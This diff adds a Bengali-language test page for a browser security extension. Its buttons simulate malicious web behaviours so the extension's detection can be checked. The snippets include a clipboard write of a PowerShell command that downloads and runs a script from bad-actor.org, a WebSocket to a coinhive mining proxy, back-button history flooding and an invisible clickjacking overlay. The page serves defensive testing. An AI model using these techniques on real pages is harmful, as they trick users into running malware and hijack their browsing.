@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AmpBlock Pro - DevOps Behavioral Security Test Suite</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=Outfit:wght@600;700;800&family=JetBrains+Mono:wght@500;700&display=swap');
+
+    :root {
+      --bg: #030712;
+      --card-bg: rgba(14, 22, 46, 0.65);
+      --card-border: rgba(255, 255, 255, 0.15);
+      --neon-cyan: #00f2fe;
+      --neon-blue: #4facfe;
+      --neon-rose: #f43f5e;
+      --neon-amber: #f59e0b;
+      --neon-emerald: #10b981;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: #f8fafc;
+      font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
+      min-height: 100vh;
+      padding: 40px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background-image: 
+        radial-gradient(circle at 10% 20%, rgba(0, 242, 254, 0.15) 0%, transparent 40%),
+        radial-gradient(circle at 90% 80%, rgba(244, 63, 94, 0.12) 0%, transparent 40%),
+        linear-gradient(180deg, #030712 0%, #080f24 100%);
+    }
+
+    .container {
+      max-width: 820px;
+      width: 100%;
+    }
+
+    .header-box {
+      text-align: center;
+      margin-bottom: 36px;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 4px 14px;
+      background: rgba(0, 242, 254, 0.12);
+      border: 1px solid rgba(0, 242, 254, 0.35);
+      border-radius: 9999px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--neon-cyan);
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+    }
+
+    h1 {
+      font-family: 'Outfit', sans-serif;
+      font-size: 32px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      margin-bottom: 10px;
+    }
+
+    p.lead {
+      color: #94a3b8;
+      font-size: 15px;
+      max-width: 600px;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
+      gap: 18px;
+      margin-bottom: 30px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 22px;
+      padding: 22px;
+      backdrop-filter: blur(28px) saturate(190%);
+      -webkit-backdrop-filter: blur(28px) saturate(190%);
+      box-shadow: 0 16px 36px -8px rgba(0, 0, 0, 0.65), inset 0 1px 1px rgba(255, 255, 255, 0.2);
+      transition: all 0.3s ease;
+    }
+
+    .card:hover {
+      border-color: rgba(255, 255, 255, 0.3);
+      transform: translateY(-3px);
+    }
+
+    .card-top {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .icon-box {
+      width: 44px;
+      height: 44px;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+    }
+
+    .card h2 {
+      font-family: 'Outfit', sans-serif;
+      font-size: 17px;
+      font-weight: 700;
+      color: #ffffff;
+    }
+
+    .card p {
+      font-size: 13px;
+      color: #94a3b8;
+      line-height: 1.5;
+      margin-bottom: 16px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 11px 16px;
+      border-radius: 14px;
+      border: none;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.25s ease;
+    }
+
+    .btn-danger {
+      background: linear-gradient(135deg, rgba(244, 63, 94, 0.25) 0%, rgba(225, 29, 72, 0.35) 100%);
+      color: #ff6b8b;
+      border: 1px solid rgba(244, 63, 94, 0.45);
+    }
+
+    .btn-danger:hover {
+      background: rgba(244, 63, 94, 0.4);
+      color: #ffffff;
+      transform: translateY(-1px);
+    }
+
+    .status-log {
+      margin-top: 10px;
+      padding: 8px 12px;
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 10px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: #cbd5e1;
+      min-height: 32px;
+      display: flex;
+      align-items: center;
+    }
+
+    .footer-note {
+      text-align: center;
+      color: #64748b;
+      font-size: 12px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header-box">
+      <span class="badge">DevOps Zero-Trust Security Suite</span>
+      <h1>AmpBlock Sentinel হিউরিস্টিক টেস্ট ল্যাব</h1>
+      <p class="lead">
+        নিচের বাটনগুলো ক্লিক করে বিভিন্ন ক্ষতিকারক ওয়েব আচরণ (Malicious Behaviors) সিমুলেট করুন। 
+        AmpBlock Pro তাৎক্ষণিকভাবে ক্ষতিকারক কোড সনাক্ত করে থ্রেট স্কোর বৃদ্ধি করবে এবং <strong>iOS 27 Liquid Glass কোয়ারেন্টাইন শিল্ড</strong> সক্রিয় করবে।
+      </p>
+    </div>
+
+    <div class="grid">
+      <!-- Test 1: Cryptomining -->
+      <div class="card">
+        <div class="card-top">
+          <div class="icon-box" style="background: rgba(245, 158, 11, 0.15); color: #fbbf24;">⛏️</div>
+          <div>
+            <h2>১. ক্রিপ্টোমাইনিং WebSocket ট্র্যাপ</h2>
+            <span style="font-size: 11px; color: #fbbf24; font-weight: 600;">Stratum Protocol Port 3333 / Coinhive</span>
+          </div>
+        </div>
+        <p>অননুমোদিত ব্যাকগ্রাউন্ড মাইনিং পুলে Stratum WebSocket কানেকশন তৈরির চেষ্টা করবে।</p>
+        <button id="testMinerBtn" class="btn btn-danger">🔥 সিমুলেট ক্রিপ্টোমাইনার সংযোগ</button>
+        <div id="minerLog" class="status-log">অপেক্ষমাণ...</div>
+      </div>
+
+      <!-- Test 2: History Trap -->
+      <div class="card">
+        <div class="card-top">
+          <div class="icon-box" style="background: rgba(244, 63, 94, 0.15); color: #f43f5e;">↩️</div>
+          <div>
+            <h2>২. ব্যাক-বাটন ও হিস্ট্রি লকআউট ট্র্যাপ</h2>
+            <span style="font-size: 11px; color: #f43f5e; font-weight: 600;">Rapid history.pushState Burst</span>
+          </div>
+        </div>
+        <p>ব্যবহারকারী যাতে সাইট থেকে বের হতে না পারে সেজন্য ১ সেকেন্ডের মধ্যে ২০ বার হিস্ট্রি স্প্যাম চালাবে।</p>
+        <button id="testHistoryBtn" class="btn btn-danger">🔥 সিমুলেট ব্যাক-বাটন লকআউট স্প্যাম</button>
+        <div id="historyLog" class="status-log">অপেক্ষমাণ...</div>
+      </div>
+
+      <!-- Test 3: Malicious Clipboard Payload -->
+      <div class="card">
+        <div class="card-top">
+          <div class="icon-box" style="background: rgba(168, 85, 247, 0.15); color: #c084fc;">📋</div>
+          <div>
+            <h2>৩. ক্লিপবোর্ড PowerShell ট্র্যাপ</h2>
+            <span style="font-size: 11px; color: #c084fc; font-weight: 600;">Fake Robot / PowerShell Injection</span>
+          </div>
+        </div>
+        <p>ক্লিপবোর্ডে ক্ষতিকারক powershell.exe কোড স্বয়ংক্রিয়ভাবে পুশ করার অপচেষ্টা চালাবে।</p>
+        <button id="testClipboardBtn" class="btn btn-danger">🔥 সিমুলেট ক্ষতিকারক ক্লিপবোর্ড ইনজেকশন</button>
+        <div id="clipboardLog" class="status-log">অপেক্ষমাণ...</div>
+      </div>
+
+      <!-- Test 4: Invisible Clickjacking Overlay -->
+      <div class="card">
+        <div class="card-top">
+          <div class="icon-box" style="background: rgba(0, 242, 254, 0.15); color: #00f2fe;">🪟</div>
+          <div>
+            <h2>৪. অদৃশ্য ক্লিকজ্যাকিং ওভারলে ট্র্যাপ</h2>
+            <span style="font-size: 11px; color: #00f2fe; font-weight: 600;">Full-Viewport Invisible Overlay Div</span>
+          </div>
+        </div>
+        <p>সম্পূর্ণ স্ক্রিন জুড়ে একটি অদৃশ্য (opacity: 0, z-index: 2147483647) ক্লিক-হাইজ্যাক ওভারলে তৈরি করবে।</p>
+        <button id="testOverlayBtn" class="btn btn-danger">🔥 সিমুলেট ক্লিকজ্যাক ওভারলে ট্র্যাপ</button>
+        <div id="overlayLog" class="status-log">অপেক্ষমাণ...</div>
+      </div>
+    </div>
+
+    <div class="footer-note">
+      AmpBlock Pro • Crafted with ❤️ by Arif Mahmud & IT support BD (https://itsupport.com.bd)
+    </div>
+  </div>
+
+  <script>
+    // 1. Cryptomining test
+    document.getElementById('testMinerBtn').addEventListener('click', () => {
+      const log = document.getElementById('minerLog');
+      log.textContent = 'কানেকশন চেষ্টা: wss://coinhive.com:3333/proxy...';
+      try {
+        const ws = new WebSocket('wss://coinhive.com:3333/proxy');
+        log.textContent = '⚠️ WebSocket তৈরি সম্পন্ন কিন্তু সেন্টিনেল দ্বারা ব্লকড!';
+      } catch (e) {
+        log.textContent = '✅ সেন্টিনেল দ্বারা ব্লকড: ' + e.message;
+      }
+    });
+
+    // 2. History flood test
+    document.getElementById('testHistoryBtn').addEventListener('click', () => {
+      const log = document.getElementById('historyLog');
+      log.textContent = 'হিস্ট্রি ফ্লাডিং শুরু (২০টি pushState কল)...';
+      for (let i = 0; i < 20; i++) {
+        history.pushState({ trap: i }, '', '#trap_' + i);
+      }
+      log.textContent = '✅ হিস্ট্রি ফ্লাডিং সম্পন্ন! সেন্টিনেল সতর্কতা তৈরি হয়েছে।';
+    });
+
+    // 3. Clipboard injection test
+    document.getElementById('testClipboardBtn').addEventListener('click', () => {
+      const log = document.getElementById('clipboardLog');
+      log.textContent = 'ক্লিপবোর্ডে PowerShell কমান্ড লেখার অপচেষ্টা...';
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText('powershell.exe -NoProfile -ExecutionPolicy Bypass -Command iex (iwr https://bad-actor.org/script.ps1)')
+          .then(() => {
+            log.textContent = 'ক্লিপবোর্ড এক্সেস সম্পন্ন।';
+          })
+          .catch((err) => {
+            log.textContent = '✅ সেন্টিনেল দ্বারা ক্লিপবোর্ড হাইজ্যাক ব্লকড!';
+          });
+      } else {
+        log.textContent = 'ক্লিপবোর্ড API অনুপলব্ধ।';
+      }
+    });
+
+    // 4. Invisible overlay test
+    document.getElementById('testOverlayBtn').addEventListener('click', () => {
+      const log = document.getElementById('overlayLog');
+      log.textContent = 'অদৃশ্য ক্লিকজ্যাকিং ডিভ ইনজেক্ট করা হচ্ছে...';
+      const trap = document.createElement('div');
+      trap.id = 'malicious_clickjack_overlay_test';
+      trap.style.cssText = 'position: fixed; inset: 0; width: 100vw; height: 100vh; z-index: 2147483640; opacity: 0; background: red; cursor: pointer;';
+      trap.addEventListener('click', () => {
+        alert('ক্লিকজ্যাক সফল! (সেন্টিনেল নিষ্ক্রিয় থাকলে এটি ঘটত)');
+      });
+      document.body.appendChild(trap);
+      log.textContent = '✅ ওভারলে ইনজেক্টেড! সেন্টিনেল এটি পরীক্ষা করে ডিফিউজ করবে।';
+    });
+  </script>
+</body>
+</html>
